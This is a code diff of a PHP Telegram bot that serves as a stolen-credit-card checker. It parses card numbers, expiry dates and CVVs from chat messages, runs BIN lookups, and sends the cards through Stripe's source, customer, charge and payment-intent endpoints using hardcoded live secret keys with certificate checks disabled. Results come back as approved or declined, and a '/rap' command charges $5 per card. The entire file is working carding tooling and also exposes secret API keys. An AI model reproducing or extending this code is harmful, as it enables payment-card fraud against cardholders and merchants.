-        //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
-        //4 => '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',                 |
-        //5 => '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',-----------------|
-        ); 
-        $skey = array_rand($skeys);
-        $sk = $skeys[$skey];
+//     elseif (strpos($message, "/dir") === 0){
+//       $skeys = array(
+//           1 => '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', // Enter at least one sk key
+//         //2 => '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',-----------------|
+//         //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
+//         //4 => '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',                 |
+//         //5 => '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',-----------------|
+//         ); 
+//         $skey = array_rand($skeys);
+//         $sk = $skeys[$skey];
     
 
   
-$message = substr($message, 4);
-$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
-$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
-$mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
-$yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
-$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
-              $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
-              $ch = curl_init();
-              curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
-              curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-              curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-              'Host: lookup.binlist.net',
-              'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-              'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
-              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-              curl_setopt($ch, CURLOPT_POSTFIELDS, '');
-              $fim = curl_exec($ch);
-              $bank = GetStr($fim, '"bank":{"name":"', '"');
-              $name = GetStr($fim, '"name":"', '"');
-              $brand = GetStr($fim, '"brand":"', '"');
-              $country = GetStr($fim, '"country":{"name":"', '"');
-              $emoji = GetStr($fim, '"emoji":"', '"');
-              $scheme = GetStr($fim, '"scheme":"', '"');
-              $type = GetStr($fim, '"type":"', '"');
-              if(strpos($fim, '"type":"credit"') !== false){
-              $bin = 'Credit';
-              }else{
-              $bin = 'Debit';
-              };
-              $ch = curl_init();
-              curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
-              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-              curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-              curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
-              $result1 = curl_exec($ch);
-              $tok1 = Getstr($result1,'"id": "','"');
-              $msg1 = Getstr($result1,'"message": "','"');
-              if(strpos($result1, "card_error")){
-                sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                return;
-              }
-              if (strpos($result1, "card_declined")){
-                sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                return;
-              }
-              if (strpos($result1, "rate_limit")){
-                sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                return;
-              }
-              if (strpos($result1, "invalid_cvc")){
-                sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                return;
-              }
-              if (strpos($result1, "sources_required_type_param")){
-                sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                return;
-              }
-              if (strpos($result1, "testmode_charges_only")){
-                sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                return;
-              }
+// $message = substr($message, 4);
+// $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
+// $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
+// $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
+// $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
+// $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
+//               $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
+//               $ch = curl_init();
+//               curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+//               curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+//               curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+//               'Host: lookup.binlist.net',
+//               'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+//               'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+//               curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+//               curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+//               curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+//               $fim = curl_exec($ch);
+//               $bank = GetStr($fim, '"bank":{"name":"', '"');
+//               $name = GetStr($fim, '"name":"', '"');
+//               $brand = GetStr($fim, '"brand":"', '"');
+//               $country = GetStr($fim, '"country":{"name":"', '"');
+//               $emoji = GetStr($fim, '"emoji":"', '"');
+//               $scheme = GetStr($fim, '"scheme":"', '"');
+//               $type = GetStr($fim, '"type":"', '"');
+//               if(strpos($fim, '"type":"credit"') !== false){
+//               $bin = 'Credit';
+//               }else{
+//               $bin = 'Debit';
+//               };
+//               $ch = curl_init();
+//               curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
+//               curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+//               curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+//               curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+//               curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+//               curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+//               curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
+//               $result1 = curl_exec($ch);
+//               $tok1 = Getstr($result1,'"id": "','"');
+//               $msg1 = Getstr($result1,'"message": "','"');
+//               if(strpos($result1, "card_error")){
+//                 sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+//                 return;
+//               }
+//               if (strpos($result1, "card_declined")){
+//                 sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+//                 return;
+//               }
+//               if (strpos($result1, "rate_limit")){
+//                 sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+//                 return;
+//               }
+//               if (strpos($result1, "invalid_cvc")){
+//                 sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+//                 return;
+//               }
+//               if (strpos($result1, "sources_required_type_param")){
+//                 sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+//                 return;
+//               }
+//               if (strpos($result1, "testmode_charges_only")){
+//                 sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+//                 return;
+//               }
 
-              $ch = curl_init();
-              curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
-              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-              curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-              curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
-              $result2 = curl_exec($ch);
-              $tok2 = Getstr($result2,'"id": "','"');
-              $msg2 = Getstr($result2,'"message": "','"');
-              if(strpos($result2, "card_error")){
-                sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                return;
-              }
-              if (strpos($result1, "invalid_cvc")){
-                sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                return;
-              }
-              if (strpos($result1, "sources_required_type_param")){
-                sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                return;
-              }
+//               $ch = curl_init();
+//               curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
+//               curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+//               curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+//               curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+//               curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+//               curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+//               curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
+//               $result2 = curl_exec($ch);
+//               $tok2 = Getstr($result2,'"id": "','"');
+//               $msg2 = Getstr($result2,'"message": "','"');
+//               if(strpos($result2, "card_error")){
+//                 sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+//                 return;
+//               }
+//               if (strpos($result1, "invalid_cvc")){
+//                 sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+//                 return;
+//               }
+//               if (strpos($result1, "sources_required_type_param")){
+//                 sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+//                 return;
+//               }
 
-              $ch = curl_init();
-              curl_setopt($ch, CURLOPT_URL, 'https://dashboard.stripe.com/v1/payment_intents');
-              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-              curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-              curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_types[]=card&amount=100&capture_method=automatic&confirm=true&currency=inr&source='.$tok1.'&customer='.$tok2.'&setup_future_usage=off_session');
-              $result3 = curl_exec($ch);
-              $msg3 = Getstr($result3,'"message": "','"');
-              $src3 = Getstr($result3,'"three_d_secure_2_source": "','"');
-              $sdk = Getstr($result3,'"use_stripe_sdk": "','"');
-              $pip = Getstr($result3,'"payment_intent": "','"');
-              $cls = Getstr($result3,'"client_secret": "','"');
-              $pid = Getstr($result3,'"id": "','"');
-              if(strpos($result3, '"object": "payment_intent"' )) {
-              sendMessage($chatId, "<b>This card need 3d authenticator please wait for authenticator...</b>%0A $result3", $message_id);
-              sendMessage($chatId, "<b>Dev info </b> %0A%0A <b>3d source: </b> $src3 %0A%0A <b>3d sdk: </b> $sdk %0A%0A <b>3d pip: </b> $pip %0A%0A <b>3d cls: </b> $cls %0A%0A <b>3d pid: </b> $pid %0A%0A <b>3d msg: </b> $msg3 %0A%0A <b>3d result: </b> $result3 %0A%0A", $message_id);
-              }
-              }
+//               $ch = curl_init();
+//               curl_setopt($ch, CURLOPT_URL, 'https://dashboard.stripe.com/v1/payment_intents');
+//               curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+//               curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+//               curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+//               curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+//               curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+//               curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_types[]=card&amount=100&capture_method=automatic&confirm=true&currency=inr&source='.$tok1.'&customer='.$tok2.'&setup_future_usage=off_session');
+//               $result3 = curl_exec($ch);
+//               $msg3 = Getstr($result3,'"message": "','"');
+//               $src3 = Getstr($result3,'"three_d_secure_2_source": "','"');
+//               $sdk = Getstr($result3,'"use_stripe_sdk": "','"');
+//               $pip = Getstr($result3,'"payment_intent": "','"');
+//               $cls = Getstr($result3,'"client_secret": "','"');
+//               $pid = Getstr($result3,'"id": "','"');
+//               if(strpos($result3, '"object": "payment_intent"' )) {
+//               sendMessage($chatId, "<b>This card need 3d authenticator please wait for authenticator...</b>%0A $result3", $message_id);
+//               sendMessage($chatId, "<b>Dev info </b> %0A%0A <b>3d source: </b> $src3 %0A%0A <b>3d sdk: </b> $sdk %0A%0A <b>3d pip: </b> $pip %0A%0A <b>3d cls: </b> $cls %0A%0A <b>3d pid: </b> $pid %0A%0A <b>3d msg: </b> $msg3 %0A%0A <b>3d result: </b> $result3 %0A%0A", $message_id);
+//               }
+//               }
 //////////=========[ccn Command]=========//////////
 elseif (strpos($message, "/ccn") === 0){
   $skeys = array(
-      1 => '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', // Enter at least one sk key
+      1 => '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', // Enter at least one sk key
     //2 => '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',-----------------|
     //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
     //4 => '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',                 |
@@ -901,7 +957,8 @@ elseif (strpos($message, "/ccn") === 0){
           $result2 = curl_exec($ch);
           $tok2 = Getstr($result2,'"id": "','"');
           $msg2 = Getstr($result2,'"message": "','"');
-          $ch = curl_init();if(strpos($result2, "card_error")){
+          $ch = curl_init();
+          if(strpos($result2, "card_error")){
             sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Respone 2 -» $msg2a </b>%0A<b>Gateway -» Stripe CCN charge V2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
             return;
           }
@@ -1000,236 +1057,573 @@ elseif (strpos($message, "/ccn") === 0){
             sendLog($chatId, "<b>BUG REPORTED /ccn</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
             }
           }
-            //////////=========[rap Command]=========//////////
+///////////========[rap Command]=========//////////
 elseif (strpos($message, "/rap") === 0){
-    $skeys = array(
-        1 => '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', // Enter at least one sk key
-      //2 => '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',-----------------|
-      //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
-      //4 => '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',                 |
-      //5 => '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',-----------------|
-      ); 
-      $skey = array_rand($skeys);
-      $sk = $skeys[$skey];
-   
+  $skeys = array(
+      1 => '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', // Enter at least one sk key
+    //2 => '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',-----------------|
+    //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
+    //4 => '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',                 |
+    //5 => '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',-----------------|
+    ); 
+    $skey = array_rand($skeys);
+    $sk = $skeys[$skey];
     $message = substr($message, 4);
     $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
     $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
     $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
     $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
     $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
-    if (empty($amt)) {
-    $amt = '1';
-    }
-            $amount = $amt * 100;
-            $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
-            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-            'Host: lookup.binlist.net',
-            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
-            $fim = curl_exec($ch);
-            $bank = GetStr($fim, '"bank":{"name":"', '"');
-            $name = GetStr($fim, '"name":"', '"');
-            $brand = GetStr($fim, '"brand":"', '"');
-            $country = GetStr($fim, '"country":{"name":"', '"');
-            $emoji = GetStr($fim, '"emoji":"', '"');
-            $scheme = GetStr($fim, '"scheme":"', '"');
-            $type = GetStr($fim, '"type":"', '"');
-            if(strpos($fim, '"type":"credit"') !== false){
-            $bin = 'Credit';
-            }else{
-            $bin = 'Debit';
-            };
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
-            $result1 = curl_exec($ch);
-            $tok1 = Getstr($result1,'"id": "','"');
-            $msg1 = Getstr($result1,'"message": "','"');
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
-            $result2 = curl_exec($ch);
-            $tok2 = Getstr($result2,'"id": "','"');
-            $msg2 = Getstr($result2,'"message": "','"');
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=500&currency=usd&customer='.$tok2.'');
-            $result3 = curl_exec($ch);
-            $msg3 = Getstr($result3,'"message": "','"');
-            $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
-            $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
-            $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
-            if(strpos($result3, '"seller_message": "Payment complete."' )) {
-            sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 5$ ✅</b>%0A<b>Response -» RAPED 5$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge v2 </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-            }
-            elseif(strpos($result2, "insufficient_funds" )) {
-            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-            elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-            elseif(strpos($result2,'"cvc_check": "pass"')){
